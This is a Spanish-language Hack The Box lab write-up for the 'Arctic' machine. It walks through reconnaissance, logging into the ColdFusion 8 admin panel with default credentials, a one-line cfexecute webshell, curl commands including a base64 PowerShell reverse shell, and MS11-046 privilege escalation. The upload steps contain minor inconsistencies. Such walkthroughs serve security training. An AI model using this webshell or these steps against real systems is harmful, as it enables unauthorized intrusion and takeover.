# 🖥️ HTB: Arctic

## Metadatos

| Campo | Valor |
|-------|-------|
| **Máquina** | Arctic |
| **Plataforma** | Hack The Box |
| **Dificultad** | Medium |
| **Categoría** | Windows / ColdFusion |
| **IP** | 10.10.10.11 |
| **OS** | Windows Server 2008 |
| **Fecha** | 2024 |
| **Tiempo** | 90 min |

---

## 🎯 Resumen Ejecutivo

> Encontré **Adobe ColdFusion 8** en el puerto 8500, exploté una vulnerabilidad de **file upload** para obtener una webshell, y escalé privilegios via **MS11-046** (afd.sys).

---

## 🔍 Reconocimiento

### Nmap Scan

```bash
nmap -sV -sC -p- -oN nmap_arctic.txt 10.10.10.11
```

| Puerto | Servicio | Versión | Estado |
|--------|----------|---------|--------|
| 135 | MSRPC | Microsoft Windows RPC | Open |
| 8500 | HTTP | Adobe ColdFusion 8 | Open |

### Web Enumeration

```bash
# ColdFusion 8 detectado
curl http://10.10.10.11:8500/CFIDE/administrator/

# Login por defecto: admin:admin
# Admin panel accesible
```

---

## 💥 Explotación

### File Upload en ColdFusion

```bash
# ColdFusion permite upload de archivos .cfm
# Crear webshell.cfm

cat > shell.cfm << 'EOF'
<cfexecute name="cmd.exe" arguments="/c #url.cmd#" timeout="5" />
EOF

# Subir via admin panel
# Extensions > Debugging Settings > Edit
# Upload: shell.ccfm
```

### Shell Inicial

```bash
# Ejecutar comandos
curl "http://10.10.10.11:8500/shell.cfm?cmd=whoami"
# arctic\tolis

# Reverse shell
curl "http://10.10.10.11:8500/shell.cfm?cmd=powershell -e [base64shell]"
```

---

## 🚀 Escalada de Privilegios

### MS11-046 (afd.sys)

```bash
# Descargar exploit
# https://www.exploit-db.com/exploits/18176

# Ejecutar en la máquina
C:\temp\ms11-046.exe

# Resultado
C:\Windows\system32>whoami
nt authority\system
```

---

## 🏁 Flags

| Flag | Valor | Ubicación |
|------|-------|-----------|
| **User** | `FLAG{...}` | `C:\Users\tolis\Desktop\user.txt` |
| **Root** | `FLAG{...}` | `C:\Users\Administrator\Desktop\root.txt` |

---

## 🛡️ Lecciones Aprendidas

### ✅ Lo que funcionó
- ColdFusion 8 tiene vulnerabilidades conocidas
- File upload es vector de ataque común
- MS11-046 funciona en Windows Server 2008 sin parches

### 🔄 Qué haría diferente
- Verificar parches de Windows inmediatamente
- Usar Metasploit para ColdFusion si está disponible

---

*Writeup creado para CDPN — Nivel Medio*
